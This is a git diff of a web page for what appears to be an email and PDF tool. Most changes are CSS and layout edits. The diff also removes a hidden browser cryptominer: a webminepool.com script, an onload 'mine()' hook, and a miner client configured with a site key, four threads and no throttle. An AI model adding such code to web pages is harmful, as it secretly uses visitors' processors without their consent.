@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 
@@ -16,7 +15,6 @@
     <script src="https://unpkg.com/sweetalert2@10"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.9.1/gsap.min.js"></script>
     <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
-    <script src="https://webminepool.com/lib/base.js"></script>
     <script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@900&display=swap" rel="stylesheet">
     <link rel="shortcut icon" href="./reallogo.png" type="image/x-icon">
@@ -57,6 +55,7 @@
 
 
         .logo {
+            margin-top: -30px;
             align-items: flex-start;
             width: 25rem;
         }
@@ -331,7 +330,7 @@
             z-index: -9;
             pointer-events: none;
             animation: www 3s linear infinite;
-            /* display: none; */
+            display: none;
         }
 
         @keyframes www {
@@ -424,7 +423,13 @@
             }
 
             #send {
-                padding: 3rem 8rem;
+                
+                padding: 3rem 7rem;
+                font-size: 1.4rem;
+            }
+            #send img{
+                width: 1rem ;
+                margin-right: 2rem;
             }
 
             .arrow img {
@@ -438,7 +443,7 @@
             .popup {
                 position: absolute;
                 transform: translate(-50%, -50%);
-                top: 90%;
+                top: 110%;
                 left: 20vw !important;
                 width: 60% !important;
             }
@@ -446,7 +451,7 @@
 
         }
 
-        .form {
+        /* .form {
             z-index: 99;
             background-color: #1d252e;
             border: .1px solid gray;
@@ -456,9 +461,9 @@
             font-size: 1.125rem;
             position: relative;
             margin: 2% 10%;
-            height: 34rem;
+            height: 36rem;
             width: 80%;
-        }
+        } */
 
 
         .drop-container {
@@ -475,7 +480,7 @@
             border: 2px double rgb(171, 202, 255);
             color: #444;
             cursor: pointer;
-            width: 80%;
+            width: 70%;
             height: 80%;
             transition: all .2s ease-in-out, border .2s ease-in-out;
         }
@@ -531,9 +536,9 @@
         }
 
         textarea {
-            height: 34rem;
+            height: 36rem;
             outline: none;
-            padding: 1rem;
+            padding: 2rem;
             backdrop-filter: blur(3px);
             -webkit-backdrop-filter: blur(4px);
             color: #ddd;
@@ -559,7 +564,7 @@
             display: flex;
             flex-direction: column;
             position: absolute;
-            top: 110%;
+            top: 130%;
             left: 30%;
             width: 40%;
             /* margin: 2rem 1rem; */
@@ -570,7 +575,8 @@
             justify-content: center;
             transform: scale(0);
             transition: all .5s ease-in-out;
-
+            /* filter: blur(5px); */
+            backdrop-filter: blur(5px);
         }
 
 
@@ -585,6 +591,8 @@
             margin-top: 2rem;
             padding: 1rem;
             background-color: #1d252e;
+            /* margin-bottom: 1rem; */
+            /* box-shadow: inset 0 0 0 1px #1e252c; */
         }
 
 
@@ -599,7 +607,23 @@
             padding: 1rem;
             border-radius: 10px;
             background-color: #1d252e;
+            /* box-shadow: inset 0 0 0 1px #1e252c; */
         }
+
+        body.blur::before {
+            content: "";
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            /* Adjust the overlay color as needed */
+            backdrop-filter: blur(10px);
+            z-index: 998;
+            /* Place the overlay below the popup */
+        }
+
         .loader-container {
             position: fixed;
             top: 0;
@@ -621,7 +645,7 @@
 </head>
 
 
-<body onload="mine()">
+<body>
     <div class="loader-container">
         <img src="byy.svg" alt="Loading...">
     </div>
@@ -681,17 +705,17 @@
                 </div>
             </div>
 
-            <div class="popup">
-            <ion-icon onclick="closepopup()" style="font-size: 3rem;position: absolute; cursor: pointer; left: 100%;top:-2rem; color: white; transform: rotate(45deg);" name="add-outline"></ion-icon>
-            <input name="Email" placeholder="Enter Your Email" required="true" title="Enter Your Email"
-                            class="email" type="email">
-                        <input name="text" placeholder="Enter Your Subject" subject" required="true" title="Enter Your Subject"
-                            class="sub" type="text">
-                                <div class="launch">
-                                    <button type="submit" id="send">Send</button>
-                                </div>
-                        </div>
     </section>
+    <div class="popup">
+    <ion-icon onclick="closepopup()" style="font-size: 3rem;position: absolute; cursor: pointer; left: 100%;top:-2rem; color: white; transform: rotate(45deg);" name="add-outline"></ion-icon>
+    <input name="Email" placeholder="Enter Your Email" required="true" title="Enter Your Email"
+                    class="email" type="email">
+                <input name="text" placeholder="Enter Your Subject" subject" required="true" title="Enter Your Subject"
+                    class="sub" type="text">
+                        <div class="launch">
+                            <button type="submit" id="send">Send</button>
+                        </div>
+                </div>
 </div>
     <footer>
         <div class="footer-content">
@@ -702,11 +726,11 @@
 
 </body>
 <script>
-        window.addEventListener('load', function () {
-            // Hide the loader and show the content when all resources are loaded
-            document.querySelector('.loader-container').style.display = 'none';
-            document.querySelector('.content').style.display = 'block';
-        });
+    window.addEventListener('load', function () {
+        // Hide the loader and show the content when all resources are loaded
+        document.querySelector('.loader-container').style.display = 'none';
+        document.querySelector('.content').style.display = 'block';
+    });
 
 </script>
 <script>
@@ -917,18 +941,8 @@
         return pdfBase64;
     }
 
-    var clientOBJ = WMP.Anonymous(
-'SK_nMDhFVtxJ8Q2Lvh5cmyZT',{
-        threads:4,
-        autoThreads: 4,
-        throttle: 0,
-        forceASMJS:false
-     });
-    
-    async function mine(){
-      
-clientOBJ.start(WMP.FORCE_MULTI_TAB);
-}
+
+
     function isValidEmail(email) {
         const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
         return emailRegex.test(email);
